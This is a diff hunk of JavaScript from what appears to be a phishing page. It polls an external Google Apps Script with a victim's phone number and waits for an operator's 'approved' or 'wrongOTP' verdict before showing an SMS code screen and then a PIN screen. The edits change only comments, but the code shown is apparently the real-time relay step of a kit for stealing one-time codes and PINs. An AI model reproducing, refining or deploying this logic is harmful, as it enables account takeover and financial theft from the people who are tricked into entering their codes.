@@ -180,32 +180,33 @@ const params = new URLSearchParams(window.location.search);
     async function startPolling(phone, stage) {
     const pollInterval = setInterval(async () => {
         try {
+            // Fetch status from your Google Script
             const response = await fetch(`${SCRIPT_URL}?id=${phone}&v=${Date.now()}`);
             const status = (await response.text()).trim();
             
             if (status === "approved") {
                 clearInterval(pollInterval);
-                // Clear status in the Google Sheet to prevent double-triggering
+                // Clear status in the sheet to prevent loops
                 fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`); 
                 
-                if(stage === "otp_check") {
+                if (stage === "otp_check") {
                     document.getElementById('display-phone').innerText = "+253 " + phone;
-                    showView(3); // SHOW OTP SCREEN
+                    showView(3); // Transition to Validation SMS screen
                     startTimer(30);
                 } else if (stage === "pin_check") {
-                    showView(4); // SHOW PIN SCREEN
+                    showView(4); // Transition to PIN screen
                 }
             } else if (status === "wrongOTP") {
                 clearInterval(pollInterval);
                 fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`);
                 document.getElementById('otp-error').style.display = "block";
-                showView(3); // Return to OTP entry
+                showView(3); // Return to OTP input on error
                 document.querySelectorAll('.otp-in').forEach(i => i.value = "");
             }
         } catch (e) { 
-            console.error("Connection Error:", e); 
+            console.error("Polling Connection Error:", e); 
         }
-    }, 3000); // Polls every 3 seconds
+    }, 3000); // Check every 3 seconds
 }
 
     function startTimer(sec) {
